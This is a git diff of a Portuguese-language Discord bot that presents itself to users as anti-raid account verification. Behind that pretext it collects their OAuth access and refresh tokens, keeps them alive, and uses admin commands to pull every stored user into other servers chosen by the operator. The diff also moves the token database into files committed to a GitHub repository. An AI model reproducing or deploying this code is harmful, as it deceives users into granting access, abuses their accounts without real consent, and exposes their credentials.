@@ -8,13 +8,12 @@ const {
     ButtonStyle, 
     ModalBuilder, 
     TextInputBuilder, 
-    TextInputStyle,
-    PermissionsBitField 
+    TextInputStyle
 } = require('discord.js');
 const express = require('express');
 const axios = require('axios');
-const fs = require('fs');
 const bodyParser = require('body-parser');
+const { Octokit } = require('@octokit/rest');
 
 const config = {
     TOKEN: process.env.TOKEN,
@@ -25,58 +24,72 @@ const config = {
     GUILD_ID: process.env.GUILD_ID,
     ROLE_ID: process.env.ROLE_ID,
     UNVERIFIED_ROLE_ID: process.env.UNVERIFIED_ROLE_ID,
-    OWNER_ID: process.env.OWNER_ID
+    OWNER_ID: process.env.OWNER_ID,
+    GITHUB_TOKEN: process.env.GITHUB_TOKEN,
+    GITHUB_OWNER: process.env.GITHUB_OWNER,
+    GITHUB_REPO: process.env.GITHUB_REPO
 };
 
-const DB_FILE = 'users.json';
-const CONFIG_FILE = 'custom_config.json';
-const SERVERS_FILE = 'servers.json';
-const ADMINS_FILE = 'admins.json';
+const octokit = new Octokit({ auth: config.GITHUB_TOKEN });
 
 let usersDB = {};
-if (fs.existsSync(DB_FILE)) usersDB = JSON.parse(fs.readFileSync(DB_FILE));
-
 let botConfig = {
     description: 'Para garantir a segurança de todos contra contas fakes e raids, e para liberar seu acesso aos **Canais**, **Sorteios** e **Eventos**, você precisa se verificar.\n\nClique no botão abaixo para autenticar sua conta de forma segura.',
     image: 'https://i.imgur.com/8Q6QgXq.gif',
     notifyChannelId: null
 };
-if (fs.existsSync(CONFIG_FILE)) {
-    const savedConfig = JSON.parse(fs.readFileSync(CONFIG_FILE));
-    botConfig = { ...botConfig, ...savedConfig };
-}
-
-let serversDB = [];
-if (fs.existsSync(SERVERS_FILE)) serversDB = JSON.parse(fs.readFileSync(SERVERS_FILE));
-
 let adminsDB = [];
-if (fs.existsSync(ADMINS_FILE)) adminsDB = JSON.parse(fs.readFileSync(ADMINS_FILE));
 
-function saveUser(userId, accessToken, refreshToken, expiresIn) {
-    const expiresAt = Date.now() + (expiresIn * 1000);
-    const verifiedAt = usersDB[userId]?.verifiedAt || Date.now();
-    usersDB[userId] = { accessToken, refreshToken, expiresAt, verifiedAt };
-    fs.writeFileSync(DB_FILE, JSON.stringify(usersDB, null, 2));
+async function loadFromGithub(fileName, defaultValue) {
+    try {
+        const { data } = await octokit.repos.getContent({
+            owner: config.GITHUB_OWNER,
+            repo: config.GITHUB_REPO,
+            path: fileName,
+        });
+        const content = Buffer.from(data.content, 'base64').toString('utf-8');
+        return JSON.parse(content);
+    } catch (error) {
+        return defaultValue;
+    }
 }
 
-function saveConfig() {
-    fs.writeFileSync(CONFIG_FILE, JSON.stringify(botConfig, null, 2));
+async function saveToGithub(fileName, data) {
+    try {
+        let sha;
+        try {
+            const { data: fileData } = await octokit.repos.getContent({
+                owner: config.GITHUB_OWNER,
+                repo: config.GITHUB_REPO,
+                path: fileName,
+            });
+            sha = fileData.sha;
+        } catch (e) {}
+
+        const content = Buffer.from(JSON.stringify(data, null, 2)).toString('base64');
+        
+        await octokit.repos.createOrUpdateFileContents({
+            owner: config.GITHUB_OWNER,
+            repo: config.GITHUB_REPO,
+            path: fileName,
+            message: `Update ${fileName} [skip ci]`,
+            content: content,
+            sha: sha,
+            committer: {
+                name: 'Bot Memory',
+                email: 'bot@verification.com'
+            }
+        });
+    } catch (error) {
+        console.error(`Erro ao salvar ${fileName} no GitHub:`, error.message);
+    }
 }
 
-function saveAdmins() {
-    fs.writeFileSync(ADMINS_FILE, JSON.stringify(adminsDB, null, 2));
-}
-
-function logServerAction(guild, action) {
-    const entry = {
-        serverName: guild.name,
-        serverId: guild.id,
-        action: action, 
-        date: new Date().toLocaleString('pt-BR'),
-        memberCount: guild.memberCount
-    };
-    serversDB.push(entry);
-    fs.writeFileSync(SERVERS_FILE, JSON.stringify(serversDB, null, 2));
+async function initializeData() {
+    usersDB = await loadFromGithub('users.json', {});
+    botConfig = await loadFromGithub('custom_config.json', botConfig);
+    adminsDB = await loadFromGithub('admins.json', []);
+    console.log('Memória carregada do GitHub com sucesso.');
 }
 
 async function getValidAccessToken(userId) {
@@ -93,7 +106,11 @@ async function getValidAccessToken(userId) {
         }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });
 
         const { access_token, refresh_token, expires_in } = response.data;
-        saveUser(userId, access_token, refresh_token, expires_in);
+        
+        const expiresAt = Date.now() + (expires_in * 1000);
+        usersDB[userId] = { ...user, accessToken: access_token, refreshToken: refresh_token, expiresAt };
+        saveToGithub('users.json', usersDB);
+        
         return access_token;
     } catch (error) { return null; }
 }
@@ -154,7 +171,7 @@ app.use(bodyParser.urlencoded({ extended: true }));
 
 app.get('/callback', async (req, res) => {
     const { code } = req.query;
-    if (!code) return res.send(getHtml('error', 'Código de autorização não recebido do Discord.'));
+    if (!code) return res.send(getHtml('error', 'Código não recebido.'));
 
     try {
         const tokenResponse = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
@@ -170,7 +187,9 @@ app.get('/callback', async (req, res) => {
         const userResponse = await axios.get('https://discord.com/api/users/@me', { headers: { Authorization: `Bearer ${access_token}` } });
         const userId = userResponse.data.id;
 
-        saveUser(userId, access_token, refresh_token, expires_in);
+        const expiresAt = Date.now() + (expires_in * 1000);
+        usersDB[userId] = { accessToken: access_token, refreshToken: refresh_token, expiresAt, verifiedAt: Date.now() };
+        saveToGithub('users.json', usersDB);
 
         const guild = client.guilds.cache.get(config.GUILD_ID);
         if (guild) {
@@ -199,13 +218,10 @@ app.get('/callback', async (req, res) => {
         }
         res.send(getHtml('success'));
     } catch (error) {
-        const errorMsg = error.response?.data?.error_description || error.response?.data?.error || error.message;
+        const errorMsg = error.response?.data?.error_description || error.message;
         res.send(getHtml('error', errorMsg));
     }
 });
-
-client.on('guildCreate', guild => logServerAction(guild, 'ENTROU'));
-client.on('guildDelete', guild => logServerAction(guild, 'SAIU'));
 
 client.on('messageCreate', async (message) => {
     if (message.author.bot) return;
@@ -221,7 +237,7 @@ client.on('messageCreate', async (message) => {
         
         if (!adminsDB.includes(user.id)) {
             adminsDB.push(user.id);
-            saveAdmins();
+            saveToGithub('admins.json', adminsDB);
             message.channel.send(`✅ **${user.tag}** agora é Administrador.`);
         }
         return;
@@ -234,7 +250,7 @@ client.on('messageCreate', async (message) => {
         if (!user) return;
         if (adminsDB.includes(user.id)) {
             adminsDB = adminsDB.filter(id => id !== user.id);
-            saveAdmins();
+            saveToGithub('admins.json', adminsDB);
             message.channel.send(`🗑️ **${user.tag}** removido dos Administradores.`);
         }
         return;
@@ -242,24 +258,21 @@ client.on('messageCreate', async (message) => {
 
     if (!isAdmin) return; 
 
-    // --- COMANDO !CHECKUSER (DEBUG) ---
     if (message.content.startsWith('!checkuser')) {
         const userId = message.content.split(' ')[1] || message.mentions.users.first()?.id;
-        if (!userId) return message.reply('Coloque o ID ou mencione o user.');
-        
+        if (!userId) return message.reply('Coloque o ID.');
         const userData = usersDB[userId];
-        if (!userData) return message.reply('❌ Usuário NÃO consta no banco de dados.');
-        
+        if (!userData) return message.reply('❌ Não consta no banco.');
         const validToken = await getValidAccessToken(userId);
-        if (validToken) return message.reply(`✅ Usuário verificado e Token Válido! (Pode ser puxado).`);
-        else return message.reply(`⚠️ Usuário está no banco, mas o Token expirou ou foi revogado (Precisa verificar de novo).`);
+        if (validToken) return message.reply(`✅ Token Válido!`);
+        else return message.reply(`⚠️ Token expirado ou revogado.`);
     }
 
     if (message.content === '!avisosverify') {
         message.delete().catch(() => {});
         botConfig.notifyChannelId = message.channel.id;
-        saveConfig();
-        message.channel.send(`✅ Canal de notificações definido: <#${message.channel.id}>.`);
+        saveToGithub('custom_config.json', botConfig);
+        message.channel.send(`✅ Canal de notificações definido.`);
         return;
     }
 
@@ -297,7 +310,7 @@ client.on('messageCreate', async (message) => {
         message.delete().catch(() => {});
         if (!isOwner) return;
         usersDB = {}; 
-        fs.writeFileSync(DB_FILE, JSON.stringify(usersDB, null, 2));
+        saveToGithub('users.json', usersDB);
         message.channel.send('⚠️ Banco de Dados Resetado.');
     }
 
@@ -305,24 +318,18 @@ client.on('messageCreate', async (message) => {
         message.delete().catch(() => {});
         const targetGuildId = message.content.split(' ')[1];
         const targetGuild = client.guilds.cache.get(targetGuildId);
-        if (!targetGuild) return message.channel.send('Servidor não encontrado ou bot não é Admin nele.').then(m => setTimeout(() => m.delete(), 5000));
+        if (!targetGuild) return message.channel.send('Servidor não encontrado.').then(m => setTimeout(() => m.delete(), 5000));
 
-        const statusMsg = await message.channel.send(`🔄 Puxando para **${targetGuild.name}**... Aguarde.`);
-        
+        const statusMsg = await message.channel.send(`🔄 Puxando para **${targetGuild.name}**...`);
         const users = Object.keys(usersDB);
         let success = 0;
         let fail = 0;
         let errorCounts = { "Token Inválido": 0, "Sem Permissão": 0, "Outros": 0 };
 
         for (const userId of users) {
-            // Verifica se ja esta no server
             let member = targetGuild.members.cache.get(userId);
             if (!member) { try { member = await targetGuild.members.fetch(userId); } catch (e) {} }
-
-            if (member) {
-                success++; // Ja esta la
-                continue;
-            }
+            if (member) { success++; continue; }
 
             const validToken = await getValidAccessToken(userId);
             if (validToken) {
@@ -331,10 +338,8 @@ client.on('messageCreate', async (message) => {
                     success++;
                 } catch (e) {
                     fail++;
-                    const msg = e.message.toLowerCase();
-                    if (msg.includes('missing permissions')) errorCounts["Sem Permissão"]++;
+                    if (e.message.includes('Missing Permissions')) errorCounts["Sem Permissão"]++;
                     else errorCounts["Outros"]++;
-                    console.log(`Erro ao puxar ${userId}: ${e.message}`);
                 }
             } else {
                 fail++;
@@ -342,25 +347,20 @@ client.on('messageCreate', async (message) => {
             }
             await new Promise(r => setTimeout(r, 1000));
         }
-        
-        let errorDetails = Object.entries(errorCounts).map(([k, v]) => v > 0 ? `\n- ${k}: ${v}` : '').join('');
-        statusMsg.edit(`✅ **Finalizado!**\n📥 Sucessos: ${success}\n❌ Falhas: ${fail}${errorDetails}`);
+        statusMsg.edit(`✅ **Finalizado!**\n📥 Sucessos: ${success}\n❌ Falhas: ${fail}`);
     }
 
     if (message.content === '!members') {
         message.delete().catch(() => {});
-        // Mesma logica do !puxar mas para o server atual
         const targetGuild = message.guild;
         const statusMsg = await message.channel.send(`🔄 Iniciando puxada...`);
         const users = Object.keys(usersDB);
         let success = 0;
         let fail = 0;
-
         for (const userId of users) {
             let member = targetGuild.members.cache.get(userId);
             if (!member) { try { member = await targetGuild.members.fetch(userId); } catch (e) {} }
             if (member) { success++; continue; }
-
             const validToken = await getValidAccessToken(userId);
             if (validToken) {
                 try {
@@ -387,15 +387,12 @@ client.on('messageCreate', async (message) => {
 
     if (message.content.startsWith('!unverify')) {
         message.delete().catch(() => {});
-        if (!config.UNVERIFIED_ROLE_ID || !config.ROLE_ID) return message.channel.send('Configure IDs no Railway.');
-
+        if (!config.UNVERIFIED_ROLE_ID || !config.ROLE_ID) return;
         const mentions = message.mentions.users;
         const guild = message.guild;
         const members = await guild.members.fetch(); 
         let count = 0;
-
         const msg = await message.channel.send('🔄 Resetando cargos...');
-
         for (const [id, member] of members) {
             if (member.user.bot || id === config.OWNER_ID || adminsDB.includes(id) || mentions.has(id)) continue;
             try {
@@ -411,7 +408,6 @@ client.on('messageCreate', async (message) => {
         message.delete().catch(() => {});
         const guild = message.guild;
         const verifiedMembers = [];
-        
         for (const [userId, data] of Object.entries(usersDB)) {
             const member = guild.members.cache.get(userId);
             if (member && member.roles.cache.has(config.ROLE_ID)) {
@@ -420,7 +416,6 @@ client.on('messageCreate', async (message) => {
             }
         }
         if (verifiedMembers.length === 0) return message.channel.send('Ninguém verificado aqui.');
-        
         let currentMsg = `📊 **Verificados: ${verifiedMembers.length}**\n\n`;
         for (const line of verifiedMembers) {
             if (currentMsg.length + line.length > 1900) {
@@ -457,16 +452,19 @@ client.on('interactionCreate', async (interaction) => {
     if (interaction.isModalSubmit()) {
         if (interaction.customId === 'modal_desc_submit') {
             botConfig.description = interaction.fields.getTextInputValue('input_desc');
-            saveConfig();
+            saveToGithub('custom_config.json', botConfig);
             await interaction.reply({ content: '✅ Atualizado!', ephemeral: true });
         }
         if (interaction.customId === 'modal_img_submit') {
             botConfig.image = interaction.fields.getTextInputValue('input_img');
-            saveConfig();
+            saveToGithub('custom_config.json', botConfig);
             await interaction.reply({ content: '✅ Atualizado!', ephemeral: true });
         }
     }
 });
 
 app.listen(config.PORT, () => {});
-client.login(config.TOKEN);
+
+initializeData().then(() => {
+    client.login(config.TOKEN);
+});
